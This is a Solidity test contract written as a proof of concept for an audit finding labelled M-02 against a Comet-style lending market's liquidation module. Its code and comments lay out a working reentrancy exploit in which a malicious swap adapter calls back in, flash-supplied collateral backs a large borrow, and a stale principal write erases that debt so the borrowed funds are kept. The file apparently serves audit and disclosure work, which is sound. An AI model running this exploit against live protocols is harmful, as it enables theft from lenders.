// SPDX-License-Identifier: BUSL-1.1
pragma solidity =0.8.15;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ICometMinimal {
    function supply(address asset, uint256 amount) external;
    function withdraw(address asset, uint256 amount) external;
}

/**
 * @title ReentrantBorrower
 * @notice TEST-ONLY attacker account for the M-02 PoC. It holds a small, liquidatable position; when the
 *         liquidation's DEX swap calls back in (via ReentrantDexAdapter), it flash-supplies a large amount
 *         of collateral and borrows a large amount of base. The module's trailing (stale)
 *         `updateDebtAndPrincipal` then overwrites the account's principal with the pre-swap value,
 *         erasing that fresh borrow — so this contract keeps the borrowed base for free. NOT FOR PRODUCTION.
 */
contract ReentrantBorrower {
    ICometMinimal public comet;
    address public base;
    address public collateral;
    uint256 public attackSupply;
    uint256 public attackBorrow;
    bool public attacked;

    function configure(
        ICometMinimal comet_,
        address base_,
        address collateral_,
        uint256 attackSupply_,
        uint256 attackBorrow_
    ) external {
        comet = comet_;
        base = base_;
        collateral = collateral_;
        attackSupply = attackSupply_;
        attackBorrow = attackBorrow_;
    }

    /// @notice Open the initial (soon-to-be-underwater) position.
    function openPosition(uint256 supplyAmount, uint256 borrowAmount) external {
        IERC20(collateral).approve(address(comet), supplyAmount);
        comet.supply(collateral, supplyAmount);
        comet.withdraw(base, borrowAmount);
    }

    /// @notice Reentrancy hook, invoked by the malicious adapter during the liquidation swap.
    function attack() external {
        if (attacked) return; // reenter only once (a single collateral swap)
        attacked = true;
        IERC20(collateral).approve(address(comet), attackSupply);
        comet.supply(collateral, attackSupply);   // flash-loaned collateral
        comet.withdraw(base, attackBorrow);         // large borrow — erased by the stale write
    }

    /// @notice Repay residual base debt (from the stolen base) so all collateral can then be withdrawn.
    function repay(uint256 amount) external {
        IERC20(base).approve(address(comet), amount);
        comet.supply(base, amount);
    }

    /// @notice Reclaim the flash-supplied collateral after the debt was erased (repay the loan off-chain).
    function withdrawCollateral(uint256 amount) external {
        comet.withdraw(collateral, amount);
    }
}
